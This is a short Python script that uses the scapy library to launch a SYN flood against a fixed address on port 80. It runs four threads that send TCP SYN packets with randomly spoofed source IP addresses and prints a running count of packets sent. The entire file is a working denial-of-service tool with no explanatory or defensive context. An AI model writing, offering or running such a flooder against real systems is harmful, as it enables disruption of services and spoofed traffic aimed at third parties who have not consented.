#!/usr/bin/env python3
import sys, time, random, threading
from scapy.all import IP, TCP, send

target = "192.168.189.200"
port = 80
count = 0
running = True

def flood():
    global count, running
    while running:
        src = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        p = IP(src=src, dst=target)/TCP(sport=random.randint(1024,65535), dport=port, flags="S", seq=random.randint(1000,9000))
        send(p, verbose=False)
        count += 1

print(f"SYN Flood -> {target}:{port}")
print("Ctrl+C to stop")
for _ in range(4):
    threading.Thread(target=flood, daemon=True).start()
try:
    while True:
        time.sleep(1)
        print(f"\rSent: {count}", end="")
except KeyboardInterrupt:
    running = False
    print(f"\nDone: {count} packets")
